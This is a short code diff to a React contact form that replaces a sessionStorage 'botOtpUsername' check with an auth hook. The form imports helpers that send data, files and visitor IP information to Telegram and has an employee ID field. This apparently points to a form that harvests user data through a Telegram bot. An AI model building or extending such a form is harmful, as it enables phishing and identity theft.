@@ -1,5 +1,6 @@
 import { useState, useRef, useEffect } from "react";
 import { useLocation } from "wouter";
+import { useAuth } from "@/lib/auth";
 import { sendTelegram, sendFileToTelegram, getIPInfo } from "@/lib/telegram";
 
 const INQUIRY_OPTIONS = [
@@ -13,6 +14,7 @@ const INQUIRY_OPTIONS = [
 
 export default function ContactForm() {
   const [, navigate] = useLocation();
+  const { isAuthenticated, user } = useAuth();
   const [username, setUsername] = useState("");
 
   const [firstName, setFirstName] = useState("");
@@ -38,10 +40,9 @@ export default function ContactForm() {
   const employeeIdRef = useRef<HTMLInputElement>(null);
 
   useEffect(() => {
-    const stored = sessionStorage.getItem("botOtpUsername");
-    if (!stored) { navigate("/login"); return; }
-    setUsername(stored);
-  }, [navigate]);
+    if (!isAuthenticated) { navigate("/login"); return; }
+    if (user?.username) setUsername(user.username);
+  }, [isAuthenticated, user, navigate]);
 
   function handleFileChange(
     e: React.ChangeEvent<HTMLInputElement>,
